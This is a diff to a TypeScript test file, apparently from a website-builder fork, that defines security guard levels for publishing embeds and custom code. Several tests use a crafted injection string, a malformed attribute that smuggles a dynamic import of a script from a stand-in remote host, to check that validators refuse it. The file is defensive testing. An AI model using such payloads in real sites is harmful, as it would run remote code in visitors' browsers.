@@ -1,4 +1,4 @@
-import { readFileSync } from "node:fs";
+import { existsSync, readFileSync } from "node:fs";
 import { fileURLToPath } from "node:url";
 import { describe, expect, test } from "vitest";
 import { parse } from "acorn";
@@ -21,8 +21,11 @@ import {
 import { generateWebstudioComponent } from "@webstudio-is/react-sdk";
 import {
   ORGANIZEOS_GUARD_LEVEL,
+  checkCustomCodeNames,
   findPausedExpressions,
+  orgEmbedsMayShip,
   orgScriptMayRun,
+  templateIconCodes,
 } from "@organizeos/site-components/org-script";
 import { dropOrgScript } from "./organizeos-org-script";
 import {
@@ -32,15 +35,21 @@ import {
   checkValueExpression,
 } from "@organizeos/site-components/org-script";
 import { migratePages } from "@webstudio-is/project-migrations/pages";
-import { assertBuildCodeValid } from "./organizeos-code-check";
+import {
+  assertBuildCodeValid,
+  assertCustomCodeNamesValid,
+} from "./organizeos-code-check";
+import { pageCarriesOrgCode } from "./organizeos-publish-facts";
 import { findGeneratedCodeProblems } from "./organizeos-generated-code";
 
 // The publish workflow sends ORGANIZEOS_GUARD_LEVEL to OrganizeOS as
 // guardLevel, and OrganizeOS launches a Website only from a build whose level
 // is high enough (docs/ORGANIZEOS-FORK.md section 5). So the level this commit
-// reports must be one its CLI meets. Each requirement of level 1 has a check
+// reports must be one its CLI meets. Each requirement of a level has a check
 // that runs here and the tests that cover it fully, which must still exist and
-// run: neither commented out nor skipped.
+// run: neither commented out nor skipped. Level 2 (a build that carries org
+// code may go live, spec 2026-11-20-builder-code-embeds-design.md, 4.5) is
+// defined and checked here while the level stays 1.
 
 const root = fileURLToPath(new URL("../../..", import.meta.url));
 
@@ -377,7 +386,7 @@ const expressionsLeftOut = async () => {
     modules.includes("PROBE_SECRET") === false &&
     JSON.stringify(
       await findGeneratedCodeProblems(`${imports}\n${modules}`)
-    ) === JSON.stringify({ undeclared: [], shadowed: [] }) &&
+    ) === JSON.stringify({ undeclared: [], shadowed: [], forbidden: [] }) &&
     findPausedExpressions({
       pages: build.pages.pages,
       instances,
@@ -452,7 +461,13 @@ const actionsLeftOut = async () => {
 // the global root's id, a data source whose id the module uses for something
 // else, a parameter named ref, raw markup, and the site's custom code. Each is
 // left out, and a plain element and a plain variable stay.
-const unshippableLeftOut = () => {
+/**
+ * The sample of what publishing leaves out, through dropOrgScript with the
+ * embed switch given: the five embed kinds (HTML Embed, Markdown Embed,
+ * JSON-LD and the custom code in both homes) beside raw markup, an unknown
+ * component, the global root's id and an element reference.
+ */
+const unshippableSample = (embedsMayShip: boolean) => {
   const parameter = (
     instanceId: string,
     name: string,
@@ -502,17 +517,26 @@ const unshippableLeftOut = () => {
     ],
     dataSources: [variable("held"), variable("Box")],
   });
-  const published = dropOrgScript({
-    ...bundle,
-    build: {
-      ...bundle.build,
-      pages: {
-        ...bundle.build.pages,
-        meta: { ...bundle.build.pages.meta, code },
+  const published = dropOrgScript(
+    {
+      ...bundle,
+      build: {
+        ...bundle.build,
+        pages: {
+          ...bundle.build.pages,
+          meta: { ...bundle.build.pages.meta, code },
+        },
+        projectSettings: { meta: { siteName: "Site", code }, compiler: {} },
       },
-      projectSettings: { meta: { siteName: "Site", code }, compiler: {} },
     },
-  });
+    { embedsMayShip }
+  );
+  return { published, code };
+};
+
+/** Level 1: with the switch given, the embeds and custom code are left out. */
+const unshippableLeftOut = (embedsMayShip: boolean) => {
+  const { published } = unshippableSample(embedsMayShip);
   return (
     JSON.stringify(instanceIds(published)) ===
       JSON.stringify(["root", "box"]) &&
@@ -521,6 +545,78 @@ const unshippableLeftOut = () => {
       JSON.stringify(["held"]) &&
     published.build.pages.meta?.code === undefined &&
     published.build.projectSettings?.meta.code === undefined
+  );
+};
+
+/**
+ * Level 2, with embeds on: raw markup, the unknown component, the global
+ * root's id and the element reference are left out, and the five embed kinds
+ * are kept.
+ */
+const unshippableLeftOutKeepingEmbeds = () => {
+  const { published, code } = unshippableSample(true);
+  return (
+    JSON.stringify(instanceIds(published)) ===
+      JSON.stringify(["root", "embed", "markdown", "json", "box"]) &&
+    JSON.stringify(propIds(published)) ===
+      JSON.stringify(["embed:code", "markdown:code", "json:code", "box:id"]) &&
+    JSON.stringify(published.build.dataSources.map(([id]) => id)) ===
+      JSON.stringify(["held"]) &&
+    published.build.pages.meta?.code === code &&
+    published.build.projectSettings?.meta.code === code
+  );
+};
+
+// The reviewer's payload (spec 2026-11-20, 4.4)
+const reviewerPayload = '<div async/ ={import("https://x.example/a.js")}>';
+
+const factsTellTheTruth = () => {
+  const sample = (code: string) =>
+    pageCarriesOrgCode({
+      rootInstanceId: "root",
+      instances: new Map([
+        instance("root", "Body", { children: children("embed") }),
+        instance("embed", "HtmlEmbed"),
+      ]),
+      props: new Map([prop("embed", "code", code)]),
+    });
+  const icon = [...templateIconCodes][0];
+  return sample("<script>1</script>") === true && sample(icon) === false;
+};
+
+const customCodeNamesChecked = () => {
+  if (checkCustomCodeNames(reviewerPayload).ok !== false) {
+    return false;
+  }
+  try {
+    assertCustomCodeNamesValid(reviewerPayload);
+    return false;
+  } catch {
+    return true;
+  }
+};
+
+const moduleCheckRefusesForbidden = async () => {
+  const found = await Promise.all(
+    [
+      'export const P = () => import("https://x.example/a.js");',
+      "export const P = () => import.meta.url;",
+      "export const P = function () { return this; };",
+    ].map(async (code) => (await findGeneratedCodeProblems(code)).forbidden)
+  );
+  return (
+    JSON.stringify(found) ===
+    JSON.stringify([["import()"], ["import.meta"], ["this"]])
+  );
+};
+
+const insertionPathExists = () => {
+  const builder = JSON.parse(
+    readFileSync(`${root}apps/builder/package.json`, "utf8")
+  ) as { dependencies?: Record<string, string> };
+  return (
+    /^\d+\.\d+\.\d+$/.test(builder.dependencies?.dompurify ?? "") &&
+    existsSync(`${root}apps/builder/app/shared/organizeos-untrusted-markup.tsx`)
   );
 };
 
@@ -539,7 +635,21 @@ const prebuildExpressions = [
 ];
 const prebuildUnsafeValues = ["prebuild", "leaves unsafe values out"];
 
+const embedsRequirementName =
+  "embeds, raw markup, custom code, element references, and instances and data sources the page module cannot ship are left out";
+const embedsOffName = "orgEmbedsMayShip() is false";
+
 const levelOne: Requirement[] = [
+  {
+    name: embedsOffName,
+    holds: () => orgEmbedsMayShip() === false,
+    coveredBy: [
+      {
+        file: "packages/sdk-components-organizeos/src/org-script.test.ts",
+        path: ["orgEmbedsMayShip", "is off"],
+      },
+    ],
+  },
   {
     name: "the org script switch is off",
     holds: () => orgScriptMayRun() === false,
@@ -878,8 +988,8 @@ const levelOne: Requirement[] = [
     ],
   },
   {
-    name: "embeds, raw markup, custom code, element references, and instances and data sources the page module cannot ship are left out",
-    holds: unshippableLeftOut,
+    name: embedsRequirementName,
+    holds: () => unshippableLeftOut(orgEmbedsMayShip()),
     coveredBy: [
       {
         file: orgScriptTests,
@@ -1046,7 +1156,187 @@ const levelOne: Requirement[] = [
   },
 ];
 
-const present = levelOne.filter(
+const insertionPathTests =
+  "apps/builder/app/shared/organizeos-untrusted-markup.test.tsx";
+const canvasTests = "apps/builder/app/canvas/organizeos-org-script.test.tsx";
+const factsTests = "packages/cli/src/organizeos-publish-facts.test.ts";
+
+/**
+ * Level 2: every level-1 requirement but the two that keep embeds off, a
+ * reworded one that leaves out raw markup and the rest and ships the five
+ * embed kinds exactly when orgEmbedsMayShip(), and four new ones.
+ */
+const levelTwo: Requirement[] = [
+  ...levelOne.filter(
+    (requirement) =>
+      requirement.name !== embedsOffName &&
+      requirement.name !== embedsRequirementName
+  ),
+  {
+    name: "raw markup, element references, and instances and data sources the page module cannot ship are left out; embeds and custom code ship exactly when orgEmbedsMayShip()",
+    holds: () =>
+      orgEmbedsMayShip()
+        ? unshippableLeftOutKeepingEmbeds()
+        : unshippableLeftOut(false),
+    coveredBy: [
+      ...(levelOne.find(
+        (requirement) => requirement.name === embedsRequirementName
+      )?.coveredBy ?? []),
+      {
+        file: orgScriptTests,
+        path: [
+          "dropOrgScript with embeds on",
+          "keeps a script embed, a bound embed, a Markdown Embed, JSON-LD and the custom code",
+        ],
+      },
+      {
+        file: orgScriptTests,
+        path: [
+          "dropOrgScript with embeds on",
+          "drops an embed with no code, a blank one, and one whose code the expression rules drop",
+        ],
+      },
+      {
+        file: orgScriptTests,
+        path: [
+          "dropOrgScript with embeds on",
+          "still drops one sample of every other kind",
+        ],
+      },
+      {
+        file: orgScriptTests,
+        path: [
+          "raw HTML in the runtime packages",
+          "JSON-LD's value cannot close its script element in the published markup",
+        ],
+      },
+    ],
+  },
+  {
+    name: "the publish facts tell the truth for a build with and without an embed",
+    holds: factsTellTheTruth,
+    coveredBy: [
+      { file: factsTests, path: ["pageCarriesOrgCode", "a script embed"] },
+      { file: factsTests, path: ["pageCarriesOrgCode", "icons only"] },
+      {
+        file: factsTests,
+        path: [
+          "pageCarriesOrgCode",
+          "the empty HTML Embed in a Content Block's templates",
+        ],
+      },
+      {
+        file: prebuildTests,
+        path: [
+          "the publish facts",
+          "a build with a script embed carries org code",
+        ],
+      },
+      {
+        file: prebuildTests,
+        path: [
+          "the publish facts",
+          "the tripwire fails the build when the fact is forced false",
+        ],
+      },
+      {
+        file: workflowTests,
+        path: [
+          "the publish workflow's org script switch",
+          "fails on orgScript true while embeds may not ship",
+        ],
+      },
+    ],
+  },
+  {
+    name: "custom code with a name JSX cannot hold fails the build",
+    holds: customCodeNamesChecked,
+    coveredBy: [
+      {
+        file: "packages/sdk-components-organizeos/src/custom-code-names.test.ts",
+        path: ["checkCustomCodeNames", "refuses %s"],
+      },
+      {
+        file: "packages/cli/src/html-to-jsx.organizeos.test.ts",
+        path: [
+          "htmlToJsx with custom code the name check accepts",
+          "htmlToJsx writes only literal JSX for %s",
+        ],
+      },
+      {
+        file: prebuildTests,
+        path: [
+          "the custom code name check",
+          "custom code with a name JSX cannot hold fails the publish at emission, naming Custom code",
+        ],
+      },
+      {
+        file: "apps/builder/app/builder/features/publish/organizeos-publish.test.tsx",
+        path: [
+          "the Publish dialog with a value that fails input validation",
+          "with embeds on, custom code with a name JSX cannot hold does not dispatch, and is named",
+        ],
+      },
+    ],
+  },
+  {
+    name: "the module check refuses import(), import.meta and this",
+    holds: moduleCheckRefusesForbidden,
+    coveredBy: [
+      {
+        file: "packages/cli/src/organizeos-generated-code.test.ts",
+        path: ["the forbidden constructs", "refuses a module that uses %s"],
+      },
+    ],
+  },
+  {
+    name: "the builder's insertion path for untrusted markup exists, pinned, and its tests run",
+    holds: insertionPathExists,
+    coveredBy: [
+      {
+        file: insertionPathTests,
+        path: ["insertUntrustedMarkup", "%s leaves nothing that runs"],
+      },
+      {
+        file: insertionPathTests,
+        path: [
+          "untrustedMarkupConfig",
+          "the configuration is the reviewed allowlist",
+        ],
+      },
+      {
+        file: insertionPathTests,
+        path: ["UntrustedMarkup", "re-inserts only when its markup changes"],
+      },
+      {
+        file: canvasTests,
+        path: [
+          "CanvasHtmlEmbed once embeds may ship",
+          "%s leaves the document inert",
+        ],
+      },
+      {
+        file: canvasTests,
+        path: [
+          "CanvasMarkdownEmbed once embeds may ship",
+          "a javascript: link, a raw iframe and a handler leave the document inert",
+        ],
+      },
+      {
+        file: "apps/builder/app/canvas/organizeos-org-script.wiring.node.test.ts",
+        path: [
+          "only the insertion path and a reviewed list write raw HTML into a builder document",
+        ],
+      },
+    ],
+  },
+];
+
+/** The requirements a level names. */
+const requirementsFor = (level: number): Requirement[] =>
+  level >= 2 ? levelTwo : levelOne;
+
+const present = requirementsFor(ORGANIZEOS_GUARD_LEVEL).filter(
   (requirement) => requirement.coveredBy.length > 0
 );
 
@@ -1267,12 +1557,55 @@ describe("ORGANIZEOS_GUARD_LEVEL", () => {
 
   test("a level of 1 or more means every level-1 requirement holds", async () => {
     if (ORGANIZEOS_GUARD_LEVEL >= 1) {
-      for (const requirement of levelOne) {
+      for (const requirement of requirementsFor(ORGANIZEOS_GUARD_LEVEL)) {
         expect(await requirement.holds(), requirement.name).toBe(true);
         expect(requirement.coveredBy.length, requirement.name).toBeGreaterThan(
           0
         );
       }
     }
+  });
+});
+
+// OrganizeOS fork: level 2 is written now and checked whatever the level is,
+// so the flip (PR C) edits only the number and its pins.
+describe("level 2", () => {
+  test.each(
+    levelTwo.map((requirement) => [requirement.name, requirement] as const)
+  )(
+    "every level-2 requirement already holds: %s",
+    async (_name, requirement) => {
+      expect(await requirement.holds()).toBe(true);
+    }
+  );
+
+  test.each(
+    levelTwo.flatMap((requirement) =>
+      requirement.coveredBy.map(
+        (covering) =>
+          [covering.path.join(" > "), covering.file, covering] as const
+      )
+    )
+  )(
+    "every level-2 requirement is covered: %s in %s",
+    async (_path, _file, covering) => {
+      expect(await isCovered(covering)).toBe(true);
+    }
+  );
+
+  test("the level-1 embed check fails with embeds on", () => {
+    expect(unshippableLeftOut(true)).toBe(false);
+    expect(unshippableLeftOut(false)).toBe(true);
+  });
+
+  test("level 2 keeps every level-1 requirement but the two that keep embeds off", () => {
+    const names = new Set(levelTwo.map((requirement) => requirement.name));
+    expect(
+      levelOne
+        .map((requirement) => requirement.name)
+        .filter((name) => names.has(name) === false)
+    ).toEqual([embedsOffName, embedsRequirementName]);
+    expect(requirementsFor(1)).toBe(levelOne);
+    expect(requirementsFor(2)).toBe(levelTwo);
   });
 });
